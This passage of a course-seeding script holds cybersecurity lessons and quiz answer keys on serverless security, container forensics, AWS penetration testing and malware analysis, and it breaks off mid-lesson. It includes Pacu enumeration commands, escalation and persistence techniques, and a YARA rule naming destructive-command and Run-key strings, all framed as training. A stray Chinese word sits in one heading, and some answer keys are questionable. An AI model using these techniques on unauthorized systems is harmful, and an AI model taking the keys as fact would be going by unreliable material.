              { text: 'What Kubernetes component is the primary attack surface?', answers: [{ text: 'The API server', isCorrect: true }, { text: 'The kubelet', isCorrect: false }, { text: 'Container runtime', isCorrect: false }, { text: 'etcd', isCorrect: false }] },
            ],
          },
          {
            title: 'Serverless Security',
            order: 3,
            content: `# Serverless Security

### Learning Objectives

- Identify unique serverless security risks
- Implement secure function configurations
- Protect against serverless attack vectors
- Monitor serverless applications

### Section 1: Serverless Risks

Over-privileged roles, event injection, insecure dependencies, exposed function URLs, and cold start vulnerabilities are unique to serverless. The provider manages infrastructure but code, permissions, and event sources remain your responsibility. The OWASP Serverless Top 10 identifies the most critical risks.

### Section 2: IAM for Serverless

Functions assume IAM roles with strict least privilege. Avoid wildcards. Use resource-based policies to restrict event sources. Every function should have a dedicated role with only the permissions it needs.

### Section 3: Event Source Security

API Gateway requires input validation. S3 triggers need content type checking. SQS messages must be validated before processing. Event injection is the primary attack vector — always validate and sanitize event data before processing.

### Section 4: Monitoring

CloudWatch for logs, X-Ray for tracing, GuardDuty for threat detection on Lambda invocations. Implement structured logging for all functions. Alert on anomalous invocation patterns.

### Hands-On Practice

1. Deploy a Lambda behind API Gateway with input validation and least-privilege IAM.
2. Implement CloudWatch alarms for anomalous function invocations.
3. Review and remediate serverless applications against OWASP Serverless Top 10.

### Key Takeaways

- Serverless does not mean serverless security
- Least privilege is critical for function roles
- Event injection is the primary attack vector
- Structured logging enables effective monitoring

### References

- AWS Lambda Security: https://docs.aws.amazon.com/lambda/latest/dg/security-best-practices.html
- OWASP Serverless Top 10: https://owasp.org/www-project-serverless-top-10/`,
            questions: [
              { text: 'What is the primary attack vector for serverless?', answers: [{ text: 'Event source injection through malicious input', isCorrect: true }, { text: 'Memory overflow', isCorrect: false }, { text: 'Physical access', isCorrect: false }, { text: 'DNS spoofing', isCorrect: false }] },
              { text: 'Who is responsible for serverless function code security?', answers: [{ text: 'The customer, not the cloud provider', isCorrect: true }, { text: 'The cloud provider', isCorrect: false }, { text: 'The framework', isCorrect: false }, { text: 'No one, it is automatic', isCorrect: false }] },
              { text: 'What restricts which event sources can invoke a function?', answers: [{ text: 'Resource-based policies', isCorrect: true }, { text: 'Network ACLs', isCorrect: false }, { text: 'Security Groups', isCorrect: false }, { text: 'Route tables', isCorrect: false }] },
              { text: 'Which service provides distributed tracing for Lambda?', answers: [{ text: 'AWS X-Ray', isCorrect: true }, { text: 'CloudWatch', isCorrect: false }, { text: 'CloudTrail', isCorrect: false }, { text: 'Amazon Inspector', isCorrect: false }] },
            ],
          },
          {
            title: 'Container Forensics & IR',
            order: 4,
            content: `# Container Forensics & IR

### Learning Objectives

- Investigate security incidents in containerized environments
- Collect forensic evidence from containers and orchestrators
- Analyze container逃逸 and runtime attacks
- Respond to container-specific threats

### Section 1: Container Incident Response

Container incidents require specialized approaches. Containers are ephemeral — evidence disappears when containers stop. Response must capture container state before destruction. Key artifacts include container logs, image layers, runtime state, orchestrator events, and host-level artifacts.

\`\`\`bash
# Capture container state before shutdown
docker inspect <container_id> > container-state.json
docker logs <container_id> > container-logs.txt
docker top <container_id> > running-processes.txt
docker diff <container_id> > filesystem-changes.txt

# Export container for offline analysis
docker export <container_id> > container-filesystem.tar

# Kubernetes: capture pod state
kubectl describe pod <pod_name> -o yaml > pod-state.yaml
kubectl logs <pod_name> --all-containers > pod-logs.txt
kubectl get events --field-selector involvedObject.name=<pod_name>
\`\`\`

### Section 2: Container Escape Analysis

Container escape is the most severe container security incident. Signs include unexpected host filesystem access, process execution outside the container namespace, network access to host services, and resource usage anomalies. Analysis requires examining kernel logs, seccomp violations, and capability abuse.

### Section 3: Image Forensics

Container images contain multiple layers with filesystem changes. Forensic analysis of images reveals malware, backdoors, secrets, and configuration issues. Tools like dive analyze image layers. Image history reveals build process and potential tampering.

\`\`\`bash
# Analyze image layers
docker history <image_name>
# Extract and analyze specific layers
dive <image_name>
# Scan image for vulnerabilities and secrets
trivy image <image_name>
trivy image --scanners vuln,secret,misconfig <image_name>
\`\`\`

### Section 4: Orchestrator Forensics

Kubernetes provides extensive audit logging. Enable audit logging to capture all API server requests. Analyze RBAC changes, pod creation events, secret access, and configuration modifications. etcd contains the cluster state and should be included in forensic collection.

### Hands-On Practice

1. Investigate a compromised container by capturing its state and analyzing filesystem changes.
2. Analyze a container image for malware and embedded secrets.
3. Enable and analyze Kubernetes audit logs for suspicious API activity.

### Key Takeaways

- Container ephemerality requires rapid evidence collection
- Container escape is the most severe container security incident
- Image analysis reveals malware, secrets, and build process issues
- Orchestrator audit logs are essential for container forensics

### References

- Docker Forensics: https://docs.docker.com/engine/security/
- Kubernetes Audit Logging: https://kubernetes.io/docs/tasks/debug/debug-cluster/audit/
- CNCF Security: https://www.cncf.io/`,
            questions: [
              { text: 'Why is container forensics different from traditional forensics?', answers: [{ text: 'Containers are ephemeral and evidence disappears when they stop', isCorrect: true }, { text: 'Containers cannot be analyzed', isCorrect: false }, { text: 'Containers do not produce logs', isCorrect: false }, { text: 'Traditional tools work the same way', isCorrect: false }] },
              { text: 'What is the most severe container security incident?', answers: [{ text: 'Container escape gaining host access', isCorrect: true }, { text: 'Container crash', isCorrect: false }, { text: 'High CPU usage', isCorrect: false }, { text: 'Image pull failure', isCorrect: false }] },
              { text: 'What tool analyzes container image layers?', answers: [{ text: 'Dive', isCorrect: true }, { text: 'Docker Compose', isCorrect: false }, { text: 'Kubectl', isCorrect: false }, { text: 'Helm', isCorrect: false }] },
              { text: 'What Kubernetes feature captures all API server requests?', answers: [{ text: 'Audit logging', isCorrect: true }, { text: 'Pod logs', isCorrect: false }, { text: 'Events', isCorrect: false }, { text: 'Metrics server', isCorrect: false }] },
            ],
          },
        ],
      },
      {
        title: 'Cloud Penetration Testing',
        order: 4,
        lessons: [
          {
            title: 'Cloud Reconnaissance & Enumeration',
            order: 1,
            content: `# Cloud Reconnaissance & Enumeration

### Learning Objectives

- Plan and execute cloud penetration tests legally
- Enumerate cloud resources and find misconfigurations
- Test IAM policies for weaknesses
- Validate security controls through adversarial simulation

### Section 1: Legal and Authorization

Obtain written authorization. Comply with provider policies. Define clear scope. AWS, Azure, and GCP allow testing of customer-owned resources without prior approval but require following responsible disclosure. Always document authorization and scope before testing.

### Section 2: Cloud Enumeration

Enumerate S3 buckets, EC2 instances across regions, Lambda functions, IAM users and roles. Probe metadata service for SSRF vulnerabilities. Map the attack surface across all accounts and regions.

\`\`\`bash
# AWS enumeration with Pacu
pacu> aws_enum_account
pacu> s3_bucket_dump
pacu> iam_privesc_scan
# Enumerate across all regions
for region in $(aws ec2 describe-regions --query 'Regions[].RegionName' --output text); do
    echo "Scanning $region"
    aws ec2 describe-instances --region $region
done
\`\`\`

### Section 3: Privilege Escalation Testing

Use iam:SimulatePrincipalPolicy to evaluate role capabilities. Look for PassRole combined with Lambda creation, CreatePolicyVersion for manipulation, and AttachRolePolicy for admin access.

### Section 4: Data Exposure Testing

Check S3 buckets, RDS instances, EBS snapshots for public accessibility. Review bucket policies and security groups. Test for common misconfigurations including public read access, weak bucket policies, and unencrypted data stores.

### Hands-On Practice

1. Use Pacu in a testing environment to enumerate resources and test IAM policies.
2. Identify all publicly accessible S3 buckets in a test account.
3. Test for privilege escalation paths using iam:SimulatePrincipalPolicy.

### Key Takeaways

- Always get written authorization before testing
- IAM misconfigurations are the most impactful finding
- Public data exposure is a critical risk
- Automated tools scale enumeration across regions

### References

- AWS Pentest Policy: https://aws.amazon.com/security/penetration-testing/
- Pacu: https://github.com/RhinoSecurityLabs/pacu
- CloudGoat: https://github.com/RhinoSecurityLabs/cloudgoat`,
            questions: [
              { text: 'What must you obtain before cloud penetration testing?', answers: [{ text: 'Written authorization from the cloud account owner', isCorrect: true }, { text: 'Nothing, testing is always allowed', isCorrect: false }, { text: 'A court order', isCorrect: false }, { text: 'Verbal permission', isCorrect: false }] },
              { text: 'What tool is used for AWS privilege escalation testing?', answers: [{ text: 'iam:SimulatePrincipalPolicy', isCorrect: true }, { text: 's3:ListBucket', isCorrect: false }, { text: 'ec2:DescribeInstances', isCorrect: false }, { text: 'cloudwatch:GetMetricData', isCorrect: false }] },
              { text: 'What is the most common impactful finding in cloud tests?', answers: [{ text: 'IAM misconfigurations', isCorrect: true }, { text: 'Physical security issues', isCorrect: false }, { text: 'DNS misconfigurations', isCorrect: false }, { text: 'Cable management', isCorrect: false }] },
              { text: 'What does Pacu primarily test?', answers: [{ text: 'AWS cloud environments for exploitation vectors', isCorrect: true }, { text: 'Azure AD', isCorrect: false }, { text: 'On-premises firewalls', isCorrect: false }, { text: 'Mobile apps', isCorrect: false }] },
            ],
          },
          {
            title: 'AWS Exploitation Techniques',
            order: 2,
            content: `# AWS Exploitation Techniques

### Learning Objectives

- Understand common AWS exploitation vectors
- Exploit misconfigured S3 buckets and IAM policies
- Extract secrets from cloud services
- Establish persistence in AWS environments

### Section 1: S3 Exploitation

S3 bucket misconfigurations enable data theft and manipulation. Common issues include public read/write access, weak bucket policies, and unencrypted data stores. Exploitation ranges from listing bucket contents to uploading malicious objects.

### Section 2: EC2 Exploitation

EC2 exploitation targets instance metadata services, misconfigured security groups, and IAM role abuse. SSRF attacks against the metadata service can extract instance credentials. EBS snapshots may contain sensitive data.

### Section 3: Lambda Exploitation

Lambda exploitation targets environment variable leakage, excessive IAM permissions, and dependency vulnerabilities. Environment variables may contain secrets. Overly permissive roles enable access to other services.

\`\`\`python
# Lambda privilege escalation example
import boto3
import json

def exploit_lambda_role(lambda_function_name):
    lambda_client = boto3.client('lambda')

    # Get the function's IAM role
    func = lambda_client.get_function(FunctionName=lambda_function_name)
    role_arn = func['Configuration']['Role']

    # The role may have permissions to access other services
    # Use the Lambda function to pivot to other AWS services
    sts = boto3.client('sts')

    # If we can modify the Lambda function, we can change its code
    # to execute our own payload with the function's role permissions
    print(f"Function role: {role_arn}")
    print(f"Potential pivot target through role permissions")
\`\`\`

### Section 4: Persistence Techniques

Persistence in AWS includes creating new IAM users, modifying trust relationships, creating new access keys, and establishing scheduled Lambda functions. Detection requires monitoring CloudTrail for IAM changes and unusual API patterns.

### Hands-On Practice

1. Identify and exploit a misconfigured S3 bucket in a test environment.
2. Extract credentials from an EC2 instance metadata service via SSRF.
3. Implement detection for AWS persistence techniques.

### Key Takeaways

- S3 misconfigurations are the most common AWS vulnerability
- Instance metadata service is a high-value target
- Lambda roles may provide excessive access to other services
- CloudTrail monitoring is essential for detecting persistence

### References

- AWS Penetration Testing: https://aws.amazon.com/security/penetration-testing/
- SANS Cloud Security: https://www.sans.org/cloud-security/`,
            questions: [
              { text: 'What is the most common AWS vulnerability?', answers: [{ text: 'S3 bucket misconfigurations', isCorrect: true }, { text: 'EC2 hardware flaws', isCorrect: false }, { text: 'AWS outages', isCorrect: false }, { text: 'Lambda cold starts', isCorrect: false }] },
              { text: 'What can SSRF against the metadata service extract?', answers: [{ text: 'Instance IAM credentials', isCorrect: true }, { text: 'S3 bucket contents', isCorrect: false }, { text: 'RDS passwords', isCorrect: false }, { text: 'CloudTrail logs', isCorrect: false }] },
              { text: 'Why are Lambda roles dangerous if over-permissive?', answers: [{ text: 'They can be used to pivot to other AWS services', isCorrect: true }, { text: 'They slow down the function', isCorrect: false }, { text: 'They increase costs', isCorrect: false }, { text: 'They are not dangerous', isCorrect: false }] },
              { text: 'What detects persistence in AWS?', answers: [{ text: 'CloudTrail monitoring for IAM changes and unusual API patterns', isCorrect: true }, { text: 'VPC Flow Logs only', isCorrect: false }, { text: 'S3 access logs only', isCorrect: false }, { text: 'CloudWatch metrics only', isCorrect: false }] },
            ],
          },
          {
            title: 'Cloud Privilege Escalation',
            order: 3,
            content: `# Cloud Privilege Escalation

### Learning Objectives

- Identify cloud privilege escalation vectors
- Test IAM configurations for escalation paths
- Implement controls to prevent escalation
- Monitor for unauthorized privilege changes

### Section 1: IAM-Based Escalation

Cloud environments offer unique escalation opportunities. IAM-based escalation occurs when compromised identities modify policies through iam:PassRole and iam:CreatePolicyVersion. Metadata service exploitation uses SSRF to extract instance credentials. Cross-account role assumption enables movement between accounts.

### Section 2: Service-Based Escalation

Services like Lambda, CloudFormation, and Systems Manager can be abused for escalation. Lambda functions with overly permissive roles can access other services. CloudFormation roles may have admin access. Systems Manager run command can execute arbitrary code on managed instances.

\`\`\`python
# Detect potential escalation paths
import boto3

def audit_escalation_paths():
    iam = boto3.client('iam')
    findings = []

    # Check for roles with iam:PassRole
    roles = iam.list_roles()['Roles']
    for role in roles:
        policies = iam.list_attached_role_policies(RoleName=role['RoleName'])
        for policy in policies['AttachedPolicies']:
            if policy['PolicyName'] == 'AdministratorAccess':
                findings.append({
                    'severity': 'critical',
                    'type': 'admin_role',
                    'role': role['RoleName']
                })

    # Check for Lambda roles with DynamoDB full access
    # (common escalation path)
    lambda_client = boto3.client('lambda')
    functions = lambda_client.list_functions()['Functions']
    for func in functions:
        role_arn = func['Configuration']['Role']
        # Check if role has overly permissive policies
        findings.append({
            'severity': 'medium',
            'type': 'lambda_role_check',
            'function': func['FunctionName'],
            'role': role_arn
        })

    return findings
\`\`\`

### Section 3: Prevention Controls

Implement IAM boundaries capping maximum permissions. Use SCPs for organization-level restrictions. Enforce IMDSv2 with hop limit of 1. Audit cross-account roles. Alert on IAM changes.

### Section 4: Detection and Monitoring

Monitor CloudTrail for AttachRolePolicy, PutRolePolicy, CreatePolicyVersion events. Correlate with other suspicious activity. Implement real-time alerting for critical IAM changes. Use AWS Config to track policy compliance.

### Hands-On Practice

1. Use Cloudsplaining to identify all privilege escalation paths in an AWS account.
2. Implement IAM boundaries to prevent escalation.
3. Create CloudTrail alerts for IAM policy changes.

### Key Takeaways

- Cloud privilege escalation exploits IAM misconfigurations
- Metadata service is a high-value target for credential theft
- IAM boundaries provide defense-in-depth
- Real-time monitoring enables rapid detection

### References

- Cloudsplaining: https://github.com/salesforce/cloudsplaining
- MITRE ATT&CK Cloud: https://attack.mitre.org/matrices/enterprise/cloud/`,
            questions: [
              { text: 'What prevents SSRF attacks on the EC2 metadata service?', answers: [{ text: 'IMDSv2 with hop limit of 1', isCorrect: true }, { text: 'Security Groups only', isCorrect: false }, { text: 'VPC configuration', isCorrect: false }, { text: 'IAM roles', isCorrect: false }] },
              { text: 'Which IAM permission combination enables escalation?', answers: [{ text: 'iam:PassRole with iam:CreatePolicyVersion', isCorrect: true }, { text: 's3:GetObject', isCorrect: false }, { text: 'ec2:DescribeInstances', isCorrect: false }, { text: 'cloudwatch:GetMetricData', isCorrect: false }] },
              { text: 'What is an IAM boundary?', answers: [{ text: 'A maximum permission cap regardless of attached policies', isCorrect: true }, { text: 'A firewall rule', isCorrect: false }, { text: 'An MFA requirement', isCorrect: false }, { text: 'A logging config', isCorrect: false }] },
              { text: 'What is the primary lateral movement vector in multi-account AWS?', answers: [{ text: 'Cross-account IAM role trust relationships', isCorrect: true }, { text: 'DNS poisoning', isCorrect: false }, { text: 'Physical access', isCorrect: false }, { text: 'Email phishing', isCorrect: false }] },
            ],
          },
          {
            title: 'Cloud Data Exfiltration',
            order: 4,
            content: `# Cloud Data Exfiltration

### Learning Objectives

- Identify cloud data exfiltration techniques
- Implement controls to prevent data leakage
- Detect exfiltration through monitoring and analysis
- Respond to data exfiltration incidents

### Section 1: Exfiltration Techniques

Cloud data exfiltration occurs through multiple channels: S3 bucket exports, snapshot copying, data transfer through VPC endpoints, DNS exfiltration, and abuse of cloud services like CloudFormation or CodePipeline. Attackers may also use compromised credentials to access and download data directly through console or API.

### Section 2: Prevention Controls

Implement S3 bucket policies that restrict cross-account access. Use VPC endpoints to control data flow paths. Enable S3 Block Public Access at the account level. Implement SCPs that restrict region usage. Configure VPC flow logs to monitor data transfer patterns.

\`\`\`python
# S3 exfiltration prevention policy
import json

deny_exfiltration_policy = {
    "Version": "2012-10-17",
    "Statement": [
        {
            "Sid": "DenyCrossAccountAccess",
            "Effect": "Deny",
            "Principal": "*",
            "Action": "s3:*",
            "Resource": "arn:aws:s3:::sensitive-bucket/*",
            "Condition": {
                "StringNotEquals": {
                    "aws:PrincipalAccount": "123456789012"
                }
            }
        },
        {
            "Sid": "DenyUnencryptedUploads",
            "Effect": "Deny",
            "Principal": "*",
            "Action": "s3:PutObject",
            "Resource": "arn:aws:s3:::sensitive-bucket/*",
            "Condition": {
                "StringNotEquals": {
                    "s3:x-amz-server-side-encryption": "aws:kms"
                }
            }
        }
    ]
}
\`\`\`

### Section 3: Detection Methods

Monitor S3 access logs for unusual download patterns. VPC flow logs reveal large outbound transfers. CloudTrail logs detect API-based data access. GuardDuty identifies anomalous data access patterns. Implement automated alerting for data volume thresholds.

### Section 4: Incident Response

When exfiltration is detected: immediately revoke access credentials, preserve access logs for investigation, assess the scope of data compromised, determine if encryption protected the data, notify affected parties per regulatory requirements, and implement controls to prevent recurrence.

### Hands-On Practice

1. Implement S3 bucket policies to prevent cross-account data exfiltration.
2. Configure VPC flow log analysis to detect large outbound transfers.
3. Create a data exfiltration response playbook.

### Key Takeaways

- Cloud data exfiltration occurs through multiple channels
- Prevention requires layered controls across IAM, network, and storage
- Detection requires monitoring access patterns and data flow
- Response must be immediate to limit data exposure

### References

- AWS Data Exfiltration Prevention: https://docs.aws.amazon.com/vpc/latest/privatelink/
- S3 Security Best Practices: https://docs.aws.amazon.com/AmazonS3/latest/userguide/security-best-practices.html`,
            questions: [
              { text: 'What is the most common cloud data exfiltration method?', answers: [{ text: 'S3 bucket access through compromised credentials', isCorrect: true }, { text: 'Physical theft of servers', isCorrect: false }, { text: 'DNS poisoning', isCorrect: false }, { text: 'Social engineering', isCorrect: false }] },
              { text: 'What S3 feature prevents public access?', answers: [{ text: 'S3 Block Public Access', isCorrect: true }, { text: 'S3 Versioning', isCorrect: false }, { text: 'S3 Lifecycle Rules', isCorrect: false }, { text: 'S3 Replication', isCorrect: false }] },
              { text: 'What reveals large outbound data transfers?', answers: [{ text: 'VPC flow logs analysis', isCorrect: true }, { text: 'CloudTrail only', isCorrect: false }, { text: 'Route 53 logs', isCorrect: false }, { text: 'CloudWatch metrics', isCorrect: false }] },
              { text: 'What is the first step when exfiltration is detected?', answers: [{ text: 'Immediately revoke access credentials', isCorrect: true }, { text: 'Wait to see if it continues', isCorrect: false }, { text: 'Only notify management', isCorrect: false }, { text: 'Reboot all instances', isCorrect: false }] },
            ],
          },
        ],
      },
    ],
  );

  // ====================================================================
  // 3. Malware Analysis & Reverse Engineering
  // ====================================================================
  await createCourseWithQuizzes(
    prisma,
    'Malware Analysis & Reverse Engineering',
    'Master the techniques and tools used to analyze malicious software. This course covers static and dynamic malware analysis, reverse engineering with IDA Pro and Ghidra, sandboxing, and understanding advanced evasion techniques used by modern malware families.',
    35,
    [
      {
        title: 'Malware Fundamentals & Static Analysis',
        order: 1,
        lessons: [
          {
            title: 'Malware Classification & Taxonomy',
            order: 1,
            content: `# Malware Classification & Taxonomy

### Learning Objectives

- Classify malware by type, behavior, and delivery mechanism
- Understand the malware development lifecycle
- Identify indicators of compromise for different malware families
- Build a malware analysis lab environment

### Section 1: Malware Types

Malware encompasses a broad category of malicious software. Viruses attach to legitimate files and spread when executed. Worms self-replicate across networks without user interaction. Trojans disguise themselves as legitimate software. Ransomware encrypts files and demands payment. Spyware secretly monitors user activity. Rootkits hide deep within the operating system. Botnets turn compromised machines into zombies. Fileless malware operates entirely in memory leaving minimal disk artifacts.

### Section 2: Advanced Malware Categories

Advanced Persistent Threats (APTs) are sophisticated long-term campaigns typically backed by nation-states. Sophisticated malware uses polymorphism to change its code on each infection, metamorphism to completely rewrite its structure, encryption to hide payloads, and anti-analysis techniques to evade detection. Understanding these categories helps analysts classify threats and select appropriate analysis approaches.

### Section 3: The Malware Development Lifecycle

Malware development follows a lifecycle: initial development, testing against security tools, distribution through various vectors, infection and propagation, command and control communication, payload execution, and evasion of detection. Understanding this lifecycle helps analysts predict and identify malware behavior at each stage.

### Section 4: Building a Malware Analysis Lab

A safe analysis environment requires isolated virtual machines with no network connectivity to production, snapshot capabilities for quick restoration, and monitoring tools pre-installed. Essential tools include Process Monitor, Wireshark, FakeNet-NG for simulating network services, and YARA for pattern matching.

\`\`\`bash
# Set up a malware analysis lab
mkdir -p ~/malware-lab/{samples,evidence,tools}
# Create isolated analysis network in VirtualBox
VBoxManage natnetwork add --netname "malware-lab" --network "192.168.56.0/24" --enable --dhcp on
# Install monitoring tools on analysis VM
sudo apt-get install -y wireshark nmap python3-pip
pip3 install yara-python oletools pefile
\`\`\`

### Hands-On Practice

1. Set up an isolated malware analysis VM with monitoring tools.
2. Classify 10 known malware samples by type and family.
3. Create a YARA rule for detecting a specific malware family.

### Key Takeaways

- Understanding malware types is essential for selecting analysis approaches
- APTs use sophisticated techniques requiring advanced analysis
- The malware lifecycle provides context for understanding behavior
- A properly configured lab ensures safe analysis

### References

- MITRE ATT&CK: https://attack.mitre.org/
- Malware Analysis Fundamentals: https://www.sans.org/white-papers/malware-analysis-fundamentals/
- Any.Run Sandbox: https://any.run/`,
            questions: [
              { text: 'What is the key difference between a virus and a worm?', answers: [{ text: 'A worm self-replicates across networks without user interaction', isCorrect: true }, { text: 'A virus is more dangerous', isCorrect: false }, { text: 'There is no difference', isCorrect: false }, { text: 'A worm only targets Linux', isCorrect: false }] },
              { text: 'What technique allows malware to change its code on each infection?', answers: [{ text: 'Polymorphism', isCorrect: true }, { text: 'Compression', isCorrect: false }, { text: 'Encryption only', isCorrect: false }, { text: 'Packing', isCorrect: false }] },
              { text: 'Why is the malware analysis lab isolated?', answers: [{ text: 'To prevent accidental infection of production systems', isCorrect: true }, { text: 'To make analysis faster', isCorrect: false }, { text: 'Malware only runs in isolation', isCorrect: false }, { text: 'To save bandwidth', isCorrect: false }] },
              { text: 'What is an APT?', answers: [{ text: 'A sophisticated long-term campaign typically backed by nation-states', isCorrect: true }, { text: 'A simple virus', isCorrect: false }, { text: 'A type of firewall', isCorrect: false }, { text: 'An antivirus tool', isCorrect: false }] },
            ],
          },
          {
            title: 'Static Analysis with PE Headers',
            order: 2,
            content: `# Static Analysis with PE Headers

### Learning Objectives

- Analyze Portable Executable (PE) headers for malware indicators
- Extract and analyze imported functions and libraries
- Identify packing and obfuscation techniques
- Use tools like PEview, pestudio, and pefile for analysis

### Section 1: PE File Structure

The Portable Executable format is the standard for Windows executables and DLLs. Understanding PE structure is essential for malware analysis. Key components include the DOS header, PE signature, file header, optional header, section headers, and the actual sections containing code and data.

### Section 2: Import Analysis

The Import Address Table (IAT) reveals which Windows APIs the malware uses, indicating its capabilities. CreateRemoteThread indicates process injection. InternetOpenA/HttpSendRequest indicates network communication. RegSetValueEx indicates registry modification. CryptEncrypt indicates encryption capability.

\`\`\`python
import pefile

def analyze_pe_imports(file_path):
    pe = pefile.PE(file_path)
    suspicious_imports = []

    suspicious_apis = {
        'CreateRemoteThread': 'Process Injection',
        'VirtualAllocEx': 'Memory Allocation for Injection',
        'WriteProcessMemory': 'Writing to Remote Process',
        'InternetOpenA': 'Network Communication',
        'HttpSendRequestA': 'HTTP Communication',
        'RegSetValueEx': 'Registry Modification',
        'CreateService': 'Service Installation',
        'CryptEncrypt': 'Encryption Capability'
    }

    for entry in pe.DIRECTORY_ENTRY_IMPORT:
        for imp in entry.imports:
            if imp.name and imp.name.decode() in suspicious_apis:
                suspicious_imports.append({
                    'api': imp.name.decode(),
                    'capability': suspicious_apis[imp.name.decode()],
                    'dll': entry.dll.decode()
                })

    return suspicious_imports
\`\`\`

### Section 3: Section Analysis

PE sections contain different types of data. The .text section contains executable code. .data contains initialized data. .rdata contains read-only data. .rsrc contains resources. Unusual section names, high entropy, or executable data sections may indicate packing.

### Section 4: Timestamp Analysis

The PE header contains a TimeDateStamp that records when the file was compiled. While this can be forged, it provides investigation context. Compile timestamps can establish malware development timelines and correlate with known campaigns.

### Hands-On Practice

1. Analyze a malware sample using PEview and pestudio to identify suspicious imports.
2. Write a Python script to extract and categorize all imported functions.
3. Compare PE headers of known malware families to identify patterns.

### Key Takeaways

- PE headers reveal malware capabilities through imported functions
- Unusual section names and high entropy indicate packing
- Import analysis is the fastest way to assess malware functionality
- Compile timestamps provide investigation context

### References

- PE Format Specification: https://docs.microsoft.com/en-us/windows/win32/debug/pe-format
- pestudio: https://www.winitor.com/
- pefile Python Library: https://github.com/erocarrera/pefile`,
            questions: [
              { text: 'What does the Import Address Table reveal about malware?', answers: [{ text: 'Which Windows APIs are used, indicating capabilities', isCorrect: true }, { text: 'The encryption algorithm used', isCorrect: false }, { text: 'The network protocols used', isCorrect: false }, { text: 'The file system changes made', isCorrect: false }] },
              { text: 'What does the CreateRemoteThread API indicate?', answers: [{ text: 'Process injection capability', isCorrect: true }, { text: 'File encryption', isCorrect: false }, { text: 'Network communication', isCorrect: false }, { text: 'Registry backup', isCorrect: false }] },
              { text: 'What does high entropy in a PE section indicate?', answers: [{ text: 'Encrypted or compressed data possibly indicating packing', isCorrect: true }, { text: 'Clean uncompressed code', isCorrect: false }, { text: 'Valid digital signature', isCorrect: false }, { text: 'Normal configuration', isCorrect: false }] },
              { text: 'What does the TimeDateStamp in the PE header provide?', answers: [{ text: 'Compile timestamp for timeline investigation', isCorrect: true }, { text: 'Exact malware author identity', isCorrect: false }, { text: 'Vulnerability details', isCorrect: false }, { text: 'Network C2 addresses', isCorrect: false }] },
            ],
          },
          {
            title: 'YARA Rule Writing',
            order: 3,
            content: `# YARA Rule Writing

### Learning Objectives

- Write effective YARA rules for malware detection
- Understand YARA rule structure and syntax
- Test and validate YARA rules against malware samples
- Integrate YARA into automated detection pipelines

### Section 1: YARA Rule Structure

YARA is a pattern-matching tool for malware identification. Rules define patterns based on strings, hexadecimal sequences, and regular expressions. Each rule has a name, optional metadata, string definitions, and a condition that determines when the rule matches.

\`\`\`yara
rule Malware_Family_X {
    meta:
        description = "Detects Malware Family X variants"
        author = "Security Team"
        date = "2024-01-15"
        severity = "high"
        reference = "https://example.com/report"

    strings:
        $s1 = "HKLM\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run"
        $s2 = { 6A 00 6A 00 6A 03 6A 00 6A 01 68 00 00 00 80 }
        $s3 = "cmd.exe /c del" ascii wide
        $reg = /reg add [A-Z]+\\\\\\\\\\\\Soft\\\\\\\\/i
        $enc = /base64[A-Za-z0-9+\\/]{40,}={0,2}/

    condition:
        uint16(0) == 0x5A4D and
        3 of ($s*) and
        $reg and
        filesize < 500KB
}
\`\`\`

### Section 2: Pattern Types

YARA supports several pattern types. Text strings use exact or case-insensitive matching. Hex strings define byte sequences with wildcards. Regular expressions provide flexible pattern matching. Each type has strengths: text strings are readable, hex strings capture exact bytes, and regex handles variable content.

### Section 3: Condition Logic

YARA conditions combine pattern matches with file properties. The condition can reference the number of string matches, file size, PE header values, and entropy. Complex conditions enable precise detection while minimizing false positives.

### Section 4: Testing and Validation

YARA rules must be tested against known malware samples and clean files to verify accuracy. False positive testing ensures legitimate software is not flagged. Rules should be versioned and documented. Integration with scanning tools enables automated detection.

### Hands-On Practice

1. Write a YARA rule to detect a specific malware family based on public IOCs.
2. Test the rule against known samples and validate detection accuracy.
3. Integrate YARA scanning into a Python-based analysis pipeline.

### Key Takeaways

- YARA rules enable pattern-based malware detection
- Rules should balance detection accuracy with false positive rates
- Testing against known samples is essential before deployment
- YARA integrates with automated scanning pipelines

### References

- YARA Documentation: https://yara.readthedocs.io/
- YARA Rules Repository: https://github.com/Yara-Rules/rules
- Florian Roth YARA Rules: https://github.com/Neo23x0/signature-base`,
            questions: [
              { text: 'What is the primary purpose of YARA rules?', answers: [{ text: 'Pattern matching for malware identification and classification', isCorrect: true }, { text: 'Dynamic execution in a sandbox', isCorrect: false }, { text: 'Network traffic capture', isCorrect: false }, { text: 'File system cleanup', isCorrect: false }] },
              { text: 'What does the uint16(0) == 0x5A4D condition check?', answers: [{ text: 'The MZ header identifying a Windows executable', isCorrect: true }, { text: 'File size', isCorrect: false }, { text: 'Entropy level', isCorrect: false }, { text: 'Digital signature', isCorrect: false }] },
              { text: 'Why must YARA rules be tested against clean files?', answers: [{ text: 'To ensure they do not produce false positives on legitimate software', isCorrect: true }, { text: 'Clean files are more important', isCorrect: false }, { text: 'Testing is optional', isCorrect: false }, { text: 'To improve scanning speed', isCorrect: false }] },
              { text: 'What pattern type provides the most flexible matching?', answers: [{ text: 'Regular expressions', isCorrect: true }, { text: 'Text strings only', isCorrect: false }, { text: 'Hex strings only', isCorrect: false }, { text: 'Integer values only', isCorrect: false }] },
            ],
          },
          {
            title: 'Code Signing & Entropy Analysis',
            order: 4,
            content: `# Code Signing & Entropy Analysis

### Learning Objectives

- Understand code signing and its role in malware distribution
- Analyze digital signatures for authenticity verification
- Use entropy analysis to detect packing and encryption
- Identify signed malware and trust exploitation techniques

### Section 1: Code Signing Fundamentals

Code signing uses digital certificates to verify software authorship and integrity. Attackers obtain legitimate certificates through theft, fraud, or compromised certificate authorities. Signed malware bypasses application whitelisting and appears more trustworthy to users.

### Section 2: Signature Verification

Windows verifies signatures using the Authenticode system. Verification checks the certificate chain, timestamp, and integrity. Invalid signatures, revoked certificates, or self-signed certificates are red flags. PowerShell execution policies and AppLocker rules can enforce signature requirements.

\`\`\`python
import subprocess
import json

def verify_signature(file_path):
    result = subprocess.run(
        ['sigcheck', '-accepteula', '-vt', '-v', '-c', file_path],
        capture_output=True, text=True
    )
    return result.stdout

def analyze_certificate(file_path):
    import pefile
    pe = pefile.PE(file_path)
    if hasattr(pe, 'DIRECTORY_ENTRY_SECURITY'):
        cert = pe.DIRECTORY_ENTRY_SECURITY[0]
        return {
            'signed': True,
            'certificate_size': len(cert.struct),
            'has_timestamp': True
        }
    return {'signed': False}
\`\`\`

### Section 3: Entropy Analysis

